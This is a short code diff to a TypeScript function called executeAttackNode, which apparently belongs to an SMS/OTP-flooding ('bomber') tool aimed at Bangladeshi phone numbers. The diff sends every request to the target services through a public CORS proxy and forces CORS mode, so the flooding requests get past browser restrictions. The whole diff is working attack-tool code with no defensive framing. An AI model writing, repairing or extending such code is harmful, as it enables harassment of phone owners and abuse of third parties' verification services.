@@ -1,5 +1,7 @@
 import { ApiNode } from '../types';
 
+const CORS_PROXY = "https://corsproxy.io/?";
+
 export const executeAttackNode = async (node: ApiNode, phone: string, signal: AbortSignal): Promise<{ ok: boolean, status: number, error?: string }> => {
     const raw = phone.replace(/^(\+88|88)/, ''); 
     const p88 = `88${raw}`; 
@@ -37,12 +39,18 @@ export const executeAttackNode = async (node: ApiNode, phone: string, signal: Ab
     }
 
     try {
-        const response = await fetch(url, {
+        // Use proxy for POST/PUT requests to ensure they pass CORS checks in the browser
+        // For GET, if it's not mixed content, we also try proxy to avoid CORS blocks
+        const useProxy = true; 
+        const finalUrl = useProxy ? `${CORS_PROXY}${encodeURIComponent(url)}` : url;
+
+        const response = await fetch(finalUrl, {
             method: node.method,
             headers: headers,
             body: !isGet ? body : undefined,
             signal,
-            mode: isGet ? 'no-cors' : 'cors',
+            // With proxy, we can use standard cors mode
+            mode: 'cors',
             cache: 'no-store',
             referrerPolicy: 'no-referrer'
         });
